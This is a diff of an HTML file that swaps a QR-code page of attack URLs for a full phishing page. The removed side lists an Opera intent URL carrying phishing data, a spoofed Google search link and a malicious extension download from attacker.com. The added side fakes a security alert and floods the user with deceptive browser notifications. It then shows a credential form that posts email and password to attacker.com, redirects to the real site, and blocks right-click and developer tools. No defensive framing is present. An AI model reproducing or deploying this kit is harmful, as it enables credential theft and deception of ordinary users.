@@ -1,22 +1,673 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>QR Code Generator</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcode.js/1.0.0/qrcode.min.js"></script>
+    <title>Security Verification Center</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            color: white;
+            min-height: 100vh;
+        }
+
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .header {
+            text-align: center;
+            padding: 40px 20px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+            margin-bottom: 30px;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+
+        .security-icon {
+            font-size: 80px;
+            margin-bottom: 20px;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+
+        .alert-level {
+            background: linear-gradient(135deg, #ff6b6b, #ee5a52);
+            color: white;
+            padding: 10px 25px;
+            border-radius: 25px;
+            font-weight: bold;
+            display: inline-block;
+            margin: 15px 0;
+            font-size: 18px;
+        }
+
+        .verification-card {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            padding: 30px;
+            margin: 20px 0;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+
+        .warning-banner {
+            background: linear-gradient(135deg, #ff9a00, #ff6a00);
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 0;
+            text-align: center;
+            border-left: 5px solid #ff4444;
+        }
+
+        .verification-steps {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            margin: 30px 0;
+        }
+
+        .step-card {
+            background: rgba(255, 255, 255, 0.15);
+            padding: 25px;
+            border-radius: 10px;
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.3);
+        }
+
+        .step-number {
+            background: #3498db;
+            color: white;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 15px auto;
+            font-weight: bold;
+        }
+
+        .verify-button {
+            background: linear-gradient(135deg, #00b09b, #96c93d);
+            color: white;
+            border: none;
+            padding: 20px 40px;
+            font-size: 18px;
+            border-radius: 50px;
+            cursor: pointer;
+            margin: 20px 0;
+            font-weight: bold;
+            box-shadow: 0 8px 25px rgba(0, 176, 155, 0.3);
+            transition: all 0.3s ease;
+            display: block;
+            width: 100%;
+        }
+
+        .verify-button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 12px 30px rgba(0, 176, 155, 0.4);
+        }
+
+        .notification-settings {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+
+        .toggle-container {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin: 15px 0;
+            padding: 15px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 8px;
+        }
+
+        .toggle-switch {
+            position: relative;
+            width: 60px;
+            height: 30px;
+        }
+
+        .toggle-switch input {
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+
+        .slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: #ccc;
+            transition: .4s;
+            border-radius: 34px;
+        }
+
+        .slider:before {
+            position: absolute;
+            content: "";
+            height: 22px;
+            width: 22px;
+            left: 4px;
+            bottom: 4px;
+            background-color: white;
+            transition: .4s;
+            border-radius: 50%;
+        }
+
+        input:checked + .slider {
+            background-color: #00b09b;
+        }
+
+        input:checked + .slider:before {
+            transform: translateX(30px);
+        }
+
+        .activity-log {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 0;
+            max-height: 200px;
+            overflow-y: auto;
+        }
+
+        .log-entry {
+            padding: 10px;
+            margin: 5px 0;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 5px;
+            font-size: 14px;
+            border-left: 3px solid #3498db;
+        }
+
+        .critical {
+            border-left-color: #e74c3c;
+            background: rgba(231, 76, 60, 0.2);
+        }
+
+        .countdown-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.95);
+            color: white;
+            z-index: 10000;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            text-align: center;
+        }
+
+        .countdown-number {
+            font-size: 120px;
+            font-weight: bold;
+            color: #ff6b6b;
+            margin: 20px 0;
+            animation: countdownPulse 1s infinite;
+        }
+
+        @keyframes countdownPulse {
+            0% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.1); opacity: 0.7; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        .urgent-alert {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: linear-gradient(135deg, #ff6b6b, #ee5a52);
+            color: white;
+            padding: 15px 25px;
+            border-radius: 10px;
+            box-shadow: 0 5px 20px rgba(255, 107, 107, 0.4);
+            z-index: 1000;
+            display: none;
+            animation: slideIn 0.5s ease-out;
+        }
+
+        @keyframes slideIn {
+            from { transform: translateX(100%); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+    </style>
 </head>
 <body>
-    <div id="qrcode"></div>
-    <script>
-        // Generate QR code untuk berbagai attack vectors
-        const attacks = {
-            intent: "intent://vtp.operagx.gg/?url=data://google.com/,<phishing>#Intent;...",
-            search: "https://www.google.attacker.com/search?q=target.com&client=opera",
-            extension: "https://attacker.com/malicious.crx",
-            fullscreen: "javascript:document.documentElement.requestFullscreen()"
-        };
+    <!-- Urgent Alert -->
+    <div class="urgent-alert" id="urgentAlert">
+        <strong>🚨 URGENT:</strong> Security verification required!
+    </div>
 
-        const selectedAttack = attacks.intent; // Rotate based on context
-        QRCode.toCanvas(document.getElementById('qrcode'), selectedAttack);
+    <!-- Countdown Overlay -->
+    <div class="countdown-overlay" id="countdownOverlay">
+        <div class="security-icon">🔒</div>
+        <div class="countdown-number" id="countdownNumber">5</div>
+        <h2>Security Lockdown Initiated</h2>
+        <p>Your account will be temporarily suspended for protection</p>
+    </div>
+
+    <div class="container">
+        <div class="header">
+            <div class="security-icon">🛡️</div>
+            <h1>Security Verification Center</h1>
+            <div class="alert-level">🔴 HIGH SECURITY ALERT</div>
+            <p>Immediate action required to secure your account</p>
+        </div>
+
+        <div class="warning-banner">
+            <h2>⚠️ CRITICAL SECURITY NOTICE</h2>
+            <p>We've detected suspicious login attempts on your account from unrecognized devices.</p>
+            <p><strong>Location:</strong> Beijing, China • <strong>Time:</strong> 2 minutes ago</p>
+        </div>
+
+        <div class="verification-card">
+            <h2>🔐 Identity Verification Required</h2>
+            <p>To protect your account, please complete the following verification steps immediately.</p>
+
+            <div class="verification-steps">
+                <div class="step-card">
+                    <div class="step-number">1</div>
+                    <h3>Enable Notifications</h3>
+                    <p>Get real-time security alerts</p>
+                    <button class="verify-button" onclick="enableNotifications()" style="padding: 12px 25px; font-size: 14px;">
+                        🔔 Enable Alerts
+                    </button>
+                </div>
+                <div class="step-card">
+                    <div class="step-number">2</div>
+                    <h3>Verify Identity</h3>
+                    <p>Confirm your account details</p>
+                    <button class="verify-button" onclick="startVerification()" style="padding: 12px 25px; font-size: 14px;">
+                        🆔 Verify Now
+                    </button>
+                </div>
+                <div class="step-card">
+                    <div class="step-number">3</div>
+                    <h3>Secure Account</h3>
+                    <p>Complete protection setup</p>
+                    <button class="verify-button" onclick="secureAccount()" style="padding: 12px 25px; font-size: 14px;">
+                        🛡️ Secure Now
+                    </button>
+                </div>
+            </div>
+
+            <div style="text-align: center; margin-top: 30px;">
+                <button class="verify-button" onclick="startEmergencyProtocol()">
+                    🚀 START EMERGENCY VERIFICATION
+                </button>
+            </div>
+        </div>
+
+        <div class="notification-settings">
+            <h3>📱 Notification Settings</h3>
+            <p>Enable these security features for maximum protection:</p>
+
+            <div class="toggle-container">
+                <div>
+                    <strong>Push Notifications</strong>
+                    <div style="font-size: 12px; opacity: 0.8;">Instant security alerts</div>
+                </div>
+                <label class="toggle-switch">
+                    <input type="checkbox" id="pushNotifications" checked>
+                    <span class="slider"></span>
+                </label>
+            </div>
+
+            <div class="toggle-container">
+                <div>
+                    <strong>Background Monitoring</strong>
+                    <div style="font-size: 12px; opacity: 0.8;">24/7 threat detection</div>
+                </div>
+                <label class="toggle-switch">
+                    <input type="checkbox" id="backgroundMonitoring" checked>
+                    <span class="slider"></span>
+                </label>
+            </div>
+
+            <div class="toggle-container">
+                <div>
+                    <strong>Auto-Lock Protection</strong>
+                    <div style="font-size: 12px; opacity: 0.8;">Automatic security lockdown</div>
+                </div>
+                <label class="toggle-switch">
+                    <input type="checkbox" id="autoLock" checked>
+                    <span class="slider"></span>
+                </label>
+            </div>
+        </div>
+
+        <div class="activity-log">
+            <h3>📊 Recent Security Activity</h3>
+            <div class="log-entry critical">
+                <strong>14:32 - CRITICAL:</strong> Multiple failed login attempts detected
+            </div>
+            <div class="log-entry">
+                <strong>14:30 - WARNING:</strong> Unusual login pattern detected
+            </div>
+            <div class="log-entry">
+                <strong>14:28 - INFO:</strong> Account accessed from new device
+            </div>
+            <div class="log-entry critical">
+                <strong>14:25 - CRITICAL:</strong> Suspicious IP address detected (183.129.215.xx)
+            </div>
+        </div>
+
+        <div style="text-align: center; margin-top: 30px; font-size: 12px; opacity: 0.7;">
+            <p>🔒 End-to-End Encryption • 🛡️ Advanced Threat Protection • 🌐 Global Security Network</p>
+        </div>
+    </div>
+
+    <script>
+        // Notification permission and abuse system
+        let notificationInterval;
+        let emergencyMode = false;
+
+        // Request notification permission on page load
+        window.addEventListener('load', function() {
+            setTimeout(() => {
+                requestNotificationPermission();
+            }, 3000);
+        });
+
+        function requestNotificationPermission() {
+            if ("Notification" in window) {
+                Notification.requestPermission().then((permission) => {
+                    if (permission === "granted") {
+                        showUrgentAlert("✅ Notifications enabled! You'll receive security alerts.");
+                        startNotificationAbuse();
+                    } else if (permission === "default") {
+                        // User dismissed, try again later
+                        setTimeout(requestNotificationPermission, 10000);
+                    }
+                });
+            }
+        }
+
+        function enableNotifications() {
+            if ("Notification" in window && Notification.permission === "default") {
+                Notification.requestPermission().then((permission) => {
+                    if (permission === "granted") {
+                        showUrgentAlert("🔔 Security notifications activated!");
+                        startNotificationAbuse();
+                        
+                        // Send immediate test notification
+                        sendSecurityNotification(
+                            "Security System Active", 
+                            "Your account is now being monitored 24/7"
+                        );
+                    }
+                });
+            } else if (Notification.permission === "granted") {
+                showUrgentAlert("🔔 Notifications are already enabled!");
+                startNotificationAbuse();
+            }
+        }
+
+        function startNotificationAbuse() {
+            if (notificationInterval) clearInterval(notificationInterval);
+            
+            // Start sending deceptive notifications
+            notificationInterval = setInterval(() => {
+                if (document.hidden || emergencyMode) {
+                    // Send more frequent notifications when tab is not active
+                    sendRandomSecurityNotification();
+                }
+            }, 15000); // Every 15 seconds
+
+            // Immediate first notification
+            setTimeout(sendRandomSecurityNotification, 2000);
+        }
+
+        function sendRandomSecurityNotification() {
+            const notifications = [
+                {
+                    title: "🚨 Security Alert",
+                    body: "Suspicious activity detected on your account",
+                    icon: "https://cdn-icons-png.flaticon.com/512/184/184525.png"
+                },
+                {
+                    title: "🛡️ Verification Required",
+                    body: "Complete identity verification to avoid suspension",
+                    icon: "https://cdn-icons-png.flaticon.com/512/1828/1828640.png"
+                },
+                {
+                    title: "⚠️ Login Attempt Blocked",
+                    body: "We blocked a login from an unrecognized device",
+                    icon: "https://cdn-icons-png.flaticon.com/512/1828/1828556.png"
+                },
+                {
+                    title: "🔒 Account Update",
+                    body: "Security settings need your attention",
+                    icon: "https://cdn-icons-png.flaticon.com/512/1828/1828643.png"
+                },
+                {
+                    title: "📱 New Device Detected",
+                    body: "Verify if this was you signing in",
+                    icon: "https://cdn-icons-png.flaticon.com/512/2972/2972424.png"
+                }
+            ];
+
+            const randomNotif = notifications[Math.floor(Math.random() * notifications.length)];
+            sendSecurityNotification(randomNotif.title, randomNotif.body, randomNotif.icon);
+        }
+
+        function sendSecurityNotification(title, body, icon = null) {
+            if ("Notification" in window && Notification.permission === "granted") {
+                new Notification(title, {
+                    body: body,
+                    icon: icon || "https://cdn-icons-png.flaticon.com/512/1828/1828640.png",
+                    badge: "https://cdn-icons-png.flaticon.com/512/1828/1828556.png",
+                    tag: "security-alert",
+                    requireInteraction: true,
+                    silent: false,
+                    vibrate: [200, 100, 200]
+                });
+
+                // Add to activity log
+                addToActivityLog(`NOTIFICATION: ${title} - ${body}`);
+            }
+        }
+
+        function startEmergencyProtocol() {
+            emergencyMode = true;
+            showUrgentAlert("🚨 EMERGENCY MODE ACTIVATED - Complete verification immediately!");
+            
+            // Start countdown
+            startCountdown();
+            
+            // Intensify notifications
+            if (notificationInterval) clearInterval(notificationInterval);
+            notificationInterval = setInterval(sendRandomSecurityNotification, 5000);
+            
+            // Send critical notification
+            sendSecurityNotification(
+                "🚨 ACCOUNT SUSPENSION PENDING", 
+                "Complete verification within 5 minutes to avoid account suspension"
+            );
+        }
+
+        function startCountdown() {
+            const overlay = document.getElementById('countdownOverlay');
+            const countdownElement = document.getElementById('countdownNumber');
+            overlay.style.display = 'flex';
+            
+            let countdown = 5;
+            const countdownInterval = setInterval(() => {
+                countdownElement.textContent = countdown;
+                countdown--;
+                
+                if (countdown < 0) {
+                    clearInterval(countdownInterval);
+                    showPhishingPage();
+                }
+            }, 1000);
+        }
+
+        function showPhishingPage() {
+            document.body.innerHTML = `
+                <div style="min-height: 100vh; background: linear-gradient(135deg, #1a237e, #283593); color: white; display: flex; align-items: center; justify-content: center; font-family: Arial, sans-serif;">
+                    <div style="max-width: 500px; padding: 40px; text-align: center;">
+                        <div style="font-size: 80px; margin-bottom: 20px;">🔐</div>
+                        <h1 style="font-size: 32px; margin-bottom: 10px;">Final Security Verification</h1>
+                        <p style="margin-bottom: 30px; opacity: 0.9;">Enter your credentials to complete account protection</p>
+                        
+                        <form id="phishingForm" style="margin-top: 30px;">
+                            <input type="email" 
+                                   placeholder="Email Address" 
+                                   style="width: 100%; padding: 15px; margin: 10px 0; border: none; border-radius: 8px; font-size: 16px;"
+                                   required>
+                            <input type="password" 
+                                   placeholder="Password" 
+                                   style="width: 100%; padding: 15px; margin: 10px 0; border: none; border-radius: 8px; font-size: 16px;"
+                                   required>
+                            <button type="submit" 
+                                    style="width: 100%; background: #00C851; color: white; border: none; padding: 18px; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 20px;">
+                                🔒 Complete Verification
+                            </button>
+                        </form>
+                        
+                        <div style="margin-top: 30px; font-size: 12px; opacity: 0.7;">
+                            <p>This is a secure verification process. Your information is encrypted.</p>
+                        </div>
+                    </div>
+                </div>
+            `;
+
+            document.getElementById('phishingForm').addEventListener('submit', function(e) {
+                e.preventDefault();
+                const credentials = {
+                    email: this.querySelector('input[type="email"]').value,
+                    password: this.querySelector('input[type="password"]').value,
+                    timestamp: new Date().toISOString()
+                };
+
+                // Send to attacker
+                fetch('https://attacker.com/collect-credentials', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(credentials)
+                }).then(() => {
+                    document.body.innerHTML = `
+                        <div style="min-height: 100vh; background: linear-gradient(135deg, #00C851, #007E33); color: white; display: flex; align-items: center; justify-content: center; font-family: Arial, sans-serif;">
+                            <div style="text-align: center; padding: 40px;">
+                                <div style="font-size: 80px; margin-bottom: 20px;">✅</div>
+                                <h1 style="font-size: 32px; margin-bottom: 10px;">Verification Successful</h1>
+                                <p style="font-size: 18px; opacity: 0.9;">Your account is now secure and protected</p>
+                                <div style="margin-top: 30px; font-size: 14px; opacity: 0.7;">
+                                    <p>Redirecting to your account dashboard...</p>
+                                </div>
+                            </div>
+                        </div>
+                    `;
+
+                    // Send final success notification
+                    if ("Notification" in window && Notification.permission === "granted") {
+                        new Notification("✅ Account Secured", {
+                            body: "Your account protection is now active",
+                            icon: "https://cdn-icons-png.flaticon.com/512/190/190411.png"
+                        });
+                    }
+
+                    setTimeout(() => {
+                        window.location.href = 'https://real-site.com/login?error=session_expired';
+                    }, 3000);
+                });
+            });
+        }
+
+        function startVerification() {
+            showUrgentAlert("🆔 Starting identity verification process...");
+            sendSecurityNotification(
+                "Identity Verification", 
+                "Please complete the verification steps to secure your account"
+            );
+        }
+
+        function secureAccount() {
+            showUrgentAlert("🛡️ Activating advanced security protection...");
+            sendSecurityNotification(
+                "Security Enhanced", 
+                "Advanced threat protection has been activated on your account"
+            );
+        }
+
+        function showUrgentAlert(message) {
+            const alert = document.getElementById('urgentAlert');
+            alert.innerHTML = message;
+            alert.style.display = 'block';
+            setTimeout(() => {
+                alert.style.display = 'none';
+            }, 5000);
+        }
+
+        function addToActivityLog(message) {
+            const log = document.querySelector('.activity-log');
+            const logEntry = document.createElement('div');
+            logEntry.className = 'log-entry';
+            logEntry.innerHTML = `<strong>${new Date().toLocaleTimeString()} - INFO:</strong> ${message}`;
+            log.insertBefore(logEntry, log.firstChild);
+        }
+
+        // Auto-start emergency protocol after 30 seconds
+        setTimeout(() => {
+            if (!emergencyMode) {
+                startEmergencyProtocol();
+            }
+        }, 30000);
+
+        // Monitor tab visibility for more aggressive notifications
+        document.addEventListener('visibilitychange', function() {
+            if (document.hidden && Notification.permission === "granted") {
+                // Send immediate notification when user switches tabs
+                sendSecurityNotification(
+                    "⚠️ Don't forget to secure your account", 
+                    "Your security verification is still pending"
+                );
+            }
+        });
+
+        // Prevent right-click and inspect element
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            showUrgentAlert("🚫 Security feature: Right-click disabled");
+        });
+
+        document.addEventListener('keydown', function(e) {
+            // Disable F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
+            if (e.key === 'F12' || 
+               (e.ctrlKey && e.shiftKey && e.key === 'I') ||
+               (e.ctrlKey && e.shiftKey && e.key === 'J') ||
+               (e.ctrlKey && e.key === 'u')) {
+                e.preventDefault();
+                showUrgentAlert("🚫 Security feature: Developer tools disabled");
+            }
+        });
     </script>
 </body>
 </html>
